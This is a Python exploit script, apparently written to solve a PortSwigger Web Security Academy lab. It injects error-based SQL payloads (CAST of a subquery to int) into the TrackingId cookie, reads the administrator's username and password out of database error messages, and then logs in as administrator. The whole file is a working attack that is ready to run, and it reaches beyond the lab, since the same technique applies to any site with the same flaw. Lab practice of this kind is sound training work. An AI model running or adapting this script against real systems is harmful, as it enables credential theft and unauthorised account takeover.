import requests
import re
import sys

url = "https://0a89005403fc7762818e2ffd008200d7.web-security-academy.net/"
tracking_id = "LrdOGEjwK8sEisdk" 
session = "6c9pxMKq6XKhSzRF1XpMcRwjDZVJ55YR"



# Helper Functions
def extract_from_error(payload):
    """
    Sends GET request with TrackingId = payload.
    Returns the string leaked in the error message, or None.
    """
    cookies = {
        "TrackingId": payload,
        "session": session
    }
    resp = requests.get(url, cookies=cookies, timeout=5)
    match = re.search(r'invalid input syntax for type integer: "([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None

def get_csrf_token(session, url):
    resp = session.get(url)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    return match.group(1) if match else None

def login_as_administrator(password):
    login_url = url + "login"
    session = requests.Session()
    csrf_token = get_csrf_token(session, login_url)
    login_data = {"username": "administrator", "password": password}
    if csrf_token:
        login_data["csrf"] = csrf_token
    resp = session.post(login_url, data=login_data)
    if "Your username is: administrator" in resp.text or "/my-account" in resp.url:
        print("[+] Login successful!")
        return True
    print("[-] Login failed.")
    return False



# Final Execution Part
def main():
    print("[*] Extracting username from users table (LIMIT 1)...")
    payload_username = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
    username = extract_from_error(payload_username)
    if username:
        print(f"[+] Extracted username: {username}")
        if username != "administrator":
            print(f"[-] Warning: Expected 'administrator', got '{username}'. Trying anyway.")
    else:
        print("[-] Failed to extract username. Check lab URL and session cookie.")
        sys.exit(1)


    print("[*] Extracting password for the same user...")
    payload_password = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    password = extract_from_error(payload_password)
    if password:
        print(f"[+] Extracted password: {password}")
    else:
        print("[-] Failed to extract password.")
        sys.exit(1)

    print("\n[*] Attempting to log in as administrator...")
    if login_as_administrator(password):
        print("\nAdministrator password extracted and login performed.")
    else:
        print(f"\nLogin failed.")

if __name__ == "__main__":
    main()